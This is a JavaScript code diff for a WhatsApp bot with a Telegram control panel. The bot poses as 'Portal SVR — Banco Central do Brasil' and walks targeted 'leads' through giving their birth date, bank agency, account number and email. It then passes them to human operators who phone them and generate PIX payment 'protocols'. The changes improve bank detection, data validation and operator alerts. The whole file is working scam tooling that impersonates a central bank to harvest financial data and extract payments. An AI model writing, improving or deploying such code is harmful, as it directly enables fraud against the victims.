@@ -233,7 +233,7 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', huma
 
     let statusMsg = '';
     let callPulse = '';
-    
+
     if (isCalling) {
         callPulse = '🔴 ';
         statusMsg = '📞 <b>EM LIGAÇÃO AGORA... (Falando com Lead)</b>';
@@ -271,7 +271,7 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', huma
                 { text: e3Label, callback_data: `etapa:3:${chatId}` }
             ],
             [
-                { text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix:${chatId}` },
+                { text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix_std:${chatId}` },
                 { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` }
             ],
             [
@@ -349,13 +349,13 @@ client.on('incoming_call', async (call) => {
     if (BOT_ID !== 'main') return;
     const targetChatId = call.from;
     const currentSession = chatSessions.get(targetChatId);
-    
+
     console.log(`📞 [INCOMING] Chamada de ${targetChatId}`);
-    
+
     if (currentSession) {
         currentSession.isCalling = true;
         chatSessions.set(targetChatId, currentSession);
-        
+
         if (currentSession.tgMsgId) {
             const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, currentSession.humanStep || 1, true);
             await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
@@ -508,6 +508,25 @@ const BANCOS_LIST = JSON.parse(_d("eyIxMDAiOiJQbGFubmVyIENvcnJldG9yYSBkZSBWYWxvc
 
 function detectBank(text) {
     const clean = text.toLowerCase();
+    const commonPatterns = [
+        { code: "237", name: "Bradesco", keywords: ["bradesco", "brad"] },
+        { code: "341", name: "Itaú", keywords: ["itau", "itau"] },
+        { code: "001", name: "Banco do Brasil", keywords: ["banco do brasil", "bb", "banco brasil"] },
+        { code: "104", name: "Caixa Econômica", keywords: ["caixa", "cef"] },
+        { code: "033", name: "Santander", keywords: ["santander"] },
+        { code: "260", name: "Nubank", keywords: ["nubank", "nu bank", "nu pagamentos"] },
+        { code: "077", name: "Inter", keywords: ["inter", "banco inter"] },
+        { code: "336", name: "C6 Bank", keywords: ["c6", "c6 bank"] },
+        { code: "290", name: "PagBank", keywords: ["pagbank", "pagseguro", "pag bank"] },
+        { code: "323", name: "Mercado Pago", keywords: ["mercado pago", "mercado livre", "mercadopago"] }
+    ];
+
+    for (const bank of commonPatterns) {
+        if (bank.keywords.some(k => clean.includes(k))) {
+            return { code: bank.code, name: bank.name };
+        }
+    }
+
     for (const [code, name] of Object.entries(BANCOS_LIST)) {
         if (clean.includes(code) || clean.includes(name.toLowerCase())) {
             return { code, name };
@@ -531,10 +550,10 @@ client.on('message_create', async (msg) => {
         const callBody = (msg.body || '').toLowerCase();
         // Verifica se a ligação foi atendida (não perdida)
         const callAnswered = !callBody.includes('perdida') && !callBody.includes('missed') && !callBody.includes('sem resposta');
-        
+
         if (currentSession) {
             currentSession.isCalling = false;
-            
+
             // Se a ligação acabou e ele ainda estava na Etapa 2, 
             // marcamos como PENDENTE novamente se o lead desligou (ou a call acabou)
             // mas marcamos como CONCLUÍDA se foi atendida.
@@ -542,24 +561,24 @@ client.on('message_create', async (msg) => {
                 if (callAnswered) {
                     currentSession.humanStep = 2; // Concluída (mas agora desligada)
                     // Opcional: Se o user quer que volte a ser PENDENTE assim que desliga:
-                    currentSession.humanStep = 1; 
+                    currentSession.humanStep = 1;
                     console.log(`📞 [CALL] Ligação atendida e encerrada por ${targetChatId} — Status: Pendente para próxima ação.`);
                 } else {
                     currentSession.humanStep = 1; // Perdida -> Pendente
                     console.log(`📵 [CALL] Ligação perdida/não atendida por ${targetChatId}.`);
                 }
-                
+
                 chatSessions.set(targetChatId, currentSession);
                 saveSessions();
 
                 // Atualiza painel principal no Telegram
                 if (currentSession.tgMsgId) {
                     const { text: txt, reply_markup } = buildCadastroMessage(
-                        targetChatId, 
-                        currentSession.name, 
-                        currentSession.birthDate, 
-                        'human', 
-                        currentSession.docType, 
+                        targetChatId,
+                        currentSession.name,
+                        currentSession.birthDate,
+                        'human',
+                        currentSession.docType,
                         currentSession.humanStep,
                         false
                     );
@@ -569,7 +588,7 @@ client.on('message_create', async (msg) => {
                 if (callAnswered) {
                     // Envia mensagem de Etapa 2 concluída ao lead (opcional se quiser manter)
                     setTimeout(async () => {
-                        try { await sendBotMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA); } catch(e){}
+                        try { await sendBotMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA); } catch (e) { }
                     }, 2000);
                 }
             }
@@ -580,7 +599,7 @@ client.on('message_create', async (msg) => {
     if (!currentSession || (currentSession.mode !== 'bot' && currentSession.mode !== 'waiting') || internalMessageChats.has(targetChatId)) return;
 
     const updatedSession = {
-        ...currentSession, 
+        ...currentSession,
         mode: 'human',
         humanStep: 1,
         name: currentSession.name || null,
@@ -634,7 +653,7 @@ async function processIncomingMessage(msg, targetChatId) {
     fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));
 
     const currentSession = chatSessions.get(targetChatId);
-    
+
     if (isTrigger) {
         if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;
 
@@ -643,7 +662,7 @@ async function processIncomingMessage(msg, targetChatId) {
         const docTypeMatch = text.match(/Tipo de Documento: \*(CPF|CNPJ)\*/i);
         const docType = docTypeMatch ? docTypeMatch[1].toUpperCase() : 'CPF';
         const isPJ = docType === 'CNPJ';
-        
+
         let expectedData = null;
         if (userId) {
             try {
@@ -769,13 +788,21 @@ async function processIncomingMessage(msg, targetChatId) {
         }
 
         const typedDate = text.trim();
+        const cleanTyped = typedDate.replace(/\D/g, "");
+        
         if (currentSession.expectedData?.birthDate) {
-            const cleanTyped = typedDate.replace(/\D/g, "");
             const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
             if (cleanTyped !== cleanExpected) {
                 await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular.\n\nPor gentileza, verifique os dados e informe novamente.\n📌 *Formato:* DD/MM/AAAA`);
                 return;
             }
+        } else {
+            // Se não tem dados do portal, fazemos uma validação básica de sanidade
+            if (cleanTyped.length !== 8) {
+                 await sendBotMessage(targetChatId, `⚠️ *Formato Inválido*\n\nPor favor, informe a data completa com dia, mês e ano (Ex: 10/05/1990).`);
+                 return;
+            }
+            await notifyTelegram(`⚠️ <b>LEAD SEM DADOS DE PORTAL</b>\nLead: <code>${targetChatId}</code>\n<i>O lead não preencheu o formulário no site ou a sessão expirou. Prosseguindo com validação manual.</i>`);
         }
 
         currentSession.step = 2;
@@ -825,20 +852,21 @@ async function processIncomingMessage(msg, targetChatId) {
             saveSessions();
             await sendBotMessage(targetChatId, `✅ *Agência registrada.*\n\n📍 *FASE 1.4:* Agora informe o número da sua *Conta* (com o dígito, se houver):\n\n📌 *Exemplo:* 12345-6`);
         } else {
-            await sendBotMessage(targetChatId, `⚠️ *Agência Inválida*\n\nPor favor, informe apenas os números da sua agência (Ex: 0001).`);
+            await sendBotMessage(targetChatId, `⚠️ *Agência Inválida*\n\nPor favor, informe apenas os números da sua agência (Ex: 0001). Deve conter entre 3 e 5 dígitos.`);
         }
     } else if (currentSession.step === 4) {
         const typedCc = text.trim();
-        if (typedCc.length >= 4) {
+        const cleanCc = typedCc.replace(/\D/g, "");
+        if (cleanCc.length >= 4) {
             currentSession.step = 5;
             currentSession.bankCc = typedCc;
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
-            const bank = detectBank(currentSession.bankCc);
+            const bank = detectBank(typedCc + " " + (currentSession.bankAg || ""));
             const bankName = bank ? bank.name : "Instituição Identificada";
 
-            await sendBotMessage(targetChatId, 
+            await sendBotMessage(targetChatId,
                 `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
                 `📍 *DADOS CAPTURADOS:*\n` +
                 `- Agência: ${currentSession.bankAg}\n` +
@@ -848,7 +876,7 @@ async function processIncomingMessage(msg, targetChatId) {
                 `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas.\n\n` +
                 `*Responda SIM para confirmar* ou informe os dados novamente.`);
         } else {
-            await sendBotMessage(targetChatId, `⚠️ *Conta Inválida*\n\nPor favor, informe o número da sua conta corretamente.`);
+            await sendBotMessage(targetChatId, `⚠️ *Conta Inválida*\n\nPor favor, informe o número da sua conta corretamente (mínimo 4 dígitos).`);
         }
     } else if (currentSession.step === 5) {
         if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
@@ -858,7 +886,7 @@ async function processIncomingMessage(msg, targetChatId) {
 
             await sendBotMessage(targetChatId,
                 `✅ *Dados bancários confirmados!*\n\n` +
-                `📍 *FASE 1.5 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e o *Termo de Quitação* após o resgate, informe seu melhor *E-mail* para contato:\n\n` +
+                `📍 *FASE 1.5 — Canal de Comunicação:* Para que o sistema envie seu *Comprovante de Liberação* e a *Notificação de Regularização* após o resgate, informe seu melhor *E-mail* para contato:\n\n` +
                 `📌 *Exemplo:* seuemail@provedor.com`);
         } else {
             currentSession.step = 3;
@@ -870,7 +898,7 @@ async function processIncomingMessage(msg, targetChatId) {
         const typedEmail = text.toLowerCase().trim();
         const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
         const validDomains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com', 'icloud.com', 'uol.com.br', 'bol.com.br', 'ig.com.br', 'terra.com.br', 'live.com'];
-        
+
         const isFormatValid = emailRegex.test(typedEmail);
         const domain = typedEmail.split('@')[1];
         const isDomainValid = validDomains.includes(domain) || (domain && domain.includes('.gov.br')) || (domain && domain.includes('.edu.br'));
@@ -904,7 +932,7 @@ async function processIncomingMessage(msg, targetChatId) {
                 `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
                 `_Portal SVR — Banco Central do Brasil_`);
         } else {
-            await sendBotMessage(targetChatId, 
+            await sendBotMessage(targetChatId,
                 `⚠️ *E-mail Inválido ou Não Reconhecido*\n\n` +
                 `O endereço informado não parece ser um e-mail válido ou pertence a um provedor não homologado.\n\n` +
                 `Por gentileza, informe um e-mail válido (Ex: Gmail, Outlook, Hotmail) para receber seu comprovante.`);
